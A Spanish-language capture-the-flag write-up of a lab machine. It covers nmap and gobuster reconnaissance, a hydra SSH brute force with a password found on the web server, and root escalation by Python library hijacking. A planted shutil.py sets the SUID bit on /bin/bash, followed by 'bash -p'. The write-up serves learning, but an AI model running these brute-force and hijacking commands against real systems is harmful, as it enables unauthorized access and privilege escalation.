tags: #fuzzing #hydra #library-hijacking
____
## Reconocimiento

Comenzamos haciendo un escaneo básico de puertos, para conocer cuales están abiertos y buscar un vector de ataque. Para ello usamos el siguiente comando:
```bash
nmap -sS -p- --min-rate 5000 -n -Pn -vvv -oN ports 172.17.0.2
```

Esto nos permite exportar al fichero **ports** todos los puertos en formato nmap. Obtenemos lo siguiente:

![[Anexos/Pasted image 20251018051344.png]]

Ahora, vamos a lanzar el siguiente comando para averiguar cuál es la versión del servicio que corre por el puerto 80 y también lanzar unos scripts de nmap parra aplicar un reconocimiento:

```bash
nmap -sCV --min-rate 5000 -vvv -n -Pn -p22,80 -vvv -oN version 172.17.0.2
```

![[Anexos/Pasted image 20251018051405.png]]

No encontramos nada interesante, así que vamos a echar un vistazo al servicio web:

![[Anexos/Pasted image 20251018051537.png]]

Dado que no vemos nada, vamos a aplicar fuzzing para descubrir directorios:

```bash 
gobuster dir -u 172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html -o dirs.txt
```

Voy a seguir aplicando fuzzing sobre el directorio javascript a ver qué encuentro:

![[Anexos/Pasted image 20251018053539.png]]

Vamos a ver de qué trata el archivo index.php:

![[Pasted image 20251018053619.png]]

Esto parece una contraseña, así que podemos probar hacer fuerza bruta con hydra seteando los parámetros de forma que no sabemos el usuario pero sí la contraseña, así que lo hacemos con el siguiente comando:

```bash
hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -p JIFGHDS87GYDFIGD ssh://172.17.0.2 -I
```

![[Pasted image 20251018055024.png]]

Hemos descubierto el usuario carlos, así que vamos a entrar por ssh a ver qué obtenemos:

```bash
ssh carlos@172.17.0.2
```

![[Anexos/Pasted image 20251018055204.png]]

Ahora, con el comando **sudo -l** vemos lo siguiente:

![[Pasted image 20251018055237.png]]

Vamos al directorio opt:

![[Pasted image 20251018055424.png]]

Vemos que tenemos permisos de escritura y ejecución en el directorio actual, por lo que podemos pensar en un ataque del estilo de borrar el script y crear otro con el mismo nombre, pero con una instrucción maliciosa.

En este caso, para complicarlo un poco, voy a intentar ejecutar un Pyhton Library Hijacking.

Primero localizo la librería que usa el script, en la siguiente ruta: **/usr/lib/python3.12**

![[Pasted image 20251018060042.png]]

Ahora, voy a crear en mi directorio personal home un archivo con el mismo nombre que la librería, usando el siguiente comando:

```python
echo 'import os; os.system("chmod u+s /bin/bash")' > shutil.py
```

![[Pasted image 20251018060519.png]]

Ahora, en otra shell a parte, vamos al directorio /opt y creamos un archivo que se llame igual que la librería, para que la busque en el directorio actual de trabajo antes de seguir buscando en las rutas del PATH. Para crear el script lo hacemos fácilmente con este comando:

```python
echo 'import os; os.system("chmod u+s /bin/bash")' > shutil.py
```

Ahora lo ejecutamos desde el directorio /opt como root con el siguiente comando:

```bash
sudo -u root /usr/bin/python3 /opt/script.py
```

Obtenemos un error, pero si ejecutamos el comando **ls -la /bin/bash** vemos lo siguiente:

![[Anexos/Pasted image 20251018061725.png]]

Ahora solo queda ejecutar lo siguiente:

```bash
bash -p
```

![[Pasted image 20251018061756.png]]

Y somos root!!
